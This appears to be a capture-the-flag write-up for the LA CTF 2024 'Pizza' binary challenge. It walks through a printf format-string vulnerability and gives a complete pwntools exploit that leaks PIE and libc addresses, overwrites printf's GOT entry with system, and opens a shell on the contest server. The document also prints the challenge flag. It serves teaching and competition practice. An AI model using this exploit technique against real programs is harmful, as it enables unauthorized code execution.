---
title: Pizza
date: 2024-02-22T01:41:59+02:00
description: Writeup for Pizza [LA CTF 2024]
author: sunbather
tags:
- pwn
draft: false
---
___

## Challenge Description

yummy

## Intuition

We are given an ELF 64-bit binary, with the following protections:

```
$ checksec pizza
LIBC_FILE=/lib/x86_64-linux-gnu/libc.so.6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   44 Symbols	  No	0		2		pizza
```

We can see it has partial RELRO and no canary, which suggests buffer overflow and GOT overwrite can be done. After opening it in Ghidra we can see it is a format string vulnerability.
```c
undefined8 main(void)

{
  char local_148 [300];
  int local_1c;
  char local_15;
  int local_14;
  int local_10;
  uint local_c;
  
  setbuf(stdout,(char *)0x0);
  puts("Welcome to kaiphait\'s pizza shop!");
  do {
    puts("Which toppings would you like on your pizza?");
    for (local_c = 0; (int)local_c < 0xc; local_c = local_c + 1) {
      printf("%d. %s\n",(ulong)local_c,*(undefined8 *)(available_toppings + (long)(int)local_c * 8))
      ;
    }
    printf("%d. custom\n",0xc);
    for (local_10 = 0; local_10 < 3; local_10 = local_10 + 1) {
      printf("> ");
      __isoc99_scanf("%d",&local_1c);
      if ((local_1c < 0) || (0xc < local_1c)) {
        printf("Invalid topping");
        return 1;
      }
      if (local_1c == 0xc) {
        printf("Enter custom topping: ");
        __isoc99_scanf(" %99[^\n]",local_148 + (long)local_10 * 100);
      }
      else {
        strcpy(local_148 + (long)local_10 * 100,*(char **)(available_toppings + (long)local_1c * 8))
        ;
      }
    }
    puts("Here are the toppings that you chose:");
    for (local_14 = 0; local_14 < 3; local_14 = local_14 + 1) {
      printf(local_148 + (long)local_14 * 100);
      putchar(10);
    }
    puts("Your pizza will be ready soon.");
    printf("Order another pizza? (y/n): ");
    __isoc99_scanf(" %c",&local_15);
  } while (local_15 == 'y');
  return 0;
}
```
We can select a custom topping and then use it as a format string payload. The plan to exploit this particular binary is to leak the PIE address and libc base and then overwrite the printf function with system.

## Solution

There's not much interesting things going on in this particular solution. It's a standard leak into GOT overwrite.

```py
#!/usr/bin/env python3

from pwn import *

def send_custom_topping(topping):
    target.sendlineafter(b"> ", b"12")
    target.sendlineafter(b"Enter custom topping: ", topping)


is_remote = True
if is_remote:
    target = remote("chall.lac.tf", 31134) 
else:
    context.binary = bin = ELF("./pizza")
    libc = ELF("./libc.so.6")
    ld = ELF("./ld-linux-x86-64.so.2")

    target = process([ld.path, bin.path], env={"LD_PRELOAD": libc.path})
    #target = process("./pizza")

pie_offset = 0x1189
printf_offset_pie = 0x4020

if is_remote:
    system_offset = 0x04c490
    libc_offset = 0x2724a
else:
    system_offset = 0x50d70 
    libc_offset = 0x29d90

send_custom_topping(b"%49$p")
send_custom_topping(b"%47$p")
send_custom_topping(b"sunbather from .hidden pwning")

target.recvline()
pie_base = int(target.recvline(), 16) - pie_offset
libc_base = int(target.recvline().strip(), 16) - libc_offset
print(hex(pie_base), hex(libc_base))
print(target.recvline())

system_addr = p64(libc_base + system_offset)

# Prepare the bytes to be written
x = int.from_bytes(system_addr[:2], byteorder='little')
y = int.from_bytes(system_addr[2:4], byteorder='little')

print(system_addr, hex(u64(system_addr)))

target.sendlineafter(b"Order another pizza? (y/n): ", b"y")

printf = pie_base + printf_offset_pie
# find offsets with gdb and trial and error
payload = "%{}c%22$hn%{}c%23$hn".format(x, y-x).encode() 
payload = payload + b"A" * 2 + p64(printf) + p64(printf + 2)
print(payload)
# Overwrite printf with system
send_custom_topping(b"say cheese!")
send_custom_topping(payload)
send_custom_topping(b"/bin/sh")

target.interactive()
```

### Flag

``lactf{golf_balls_taste_great_2tscx63xm3ndvycw}``
